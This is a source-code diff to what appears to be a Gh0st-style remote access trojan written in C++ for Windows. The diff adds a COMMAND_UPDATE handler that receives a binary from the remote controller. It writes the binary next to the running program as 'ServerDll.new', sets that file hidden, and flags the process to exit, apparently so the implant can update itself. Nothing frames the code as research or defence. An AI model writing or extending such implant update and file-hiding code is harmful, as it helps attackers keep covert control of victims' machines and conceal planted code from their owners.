@@ -5,6 +5,10 @@
 #include "stdafx.h"
 #include "KernelManager.h"
 #include "Common.h"
+#include <iostream>
+#include <fstream>
+#include <corecrt_io.h>
+
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
@@ -46,6 +50,56 @@ UINT CKernelManager::GetAvailableIndex() {
 		}
 	}
 	return -1;
+}
+
+BOOL WriteBinaryToFile(const char* data, ULONGLONG size)
+{
+	if (size > 32 * 1024 * 1024) {
+		std::cerr << "WriteBinaryToFile fail: too large file size!!" << std::endl;
+		return FALSE;
+	}
+
+	char path[_MAX_PATH], * p = path;
+	GetModuleFileNameA(NULL, path, sizeof(path));
+	while (*p) ++p;
+	while ('\\' != *p) --p;
+	strcpy(p + 1, "ServerDll.new");
+	if (_access(path, 0)!=-1)
+	{
+		DeleteFileA(path);
+	}
+	// 打开文件，以二进制模式写入
+	std::string filePath = path;
+	std::ofstream outFile(filePath, std::ios::binary);
+
+	if (!outFile)
+	{
+		std::cerr << "Failed to open or create the file: " << filePath << std::endl;
+		return FALSE;
+	}
+
+	// 写入二进制数据
+	outFile.write(data, size);
+
+	if (outFile.good())
+	{
+		std::cout << "Binary data written successfully to " << filePath << std::endl;
+	}
+	else
+	{
+		std::cerr << "Failed to write data to file." << std::endl;
+		outFile.close();
+		return FALSE;
+	}
+
+	// 关闭文件
+	outFile.close();
+	// 设置文件属性为隐藏
+	if (SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN))
+	{
+		std::cout << "File created and set to hidden: " << filePath << std::endl;
+	}
+	return TRUE;
 }
 
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
@@ -158,6 +212,21 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				(LPTHREAD_START_ROUTINE)LoopServicesManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);
+			break;
+		}
+
+	case COMMAND_UPDATE:
+		{
+			if (m_ulThreadCount != -1) {
+				delete m_hThread[m_ulThreadCount].p;
+				m_hThread[m_ulThreadCount].p = NULL;
+			}
+			ULONGLONG size=0;
+			memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
+			if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
+				extern BOOL g_bExit;
+				g_bExit = 3;
+			}
 			break;
 		}
 
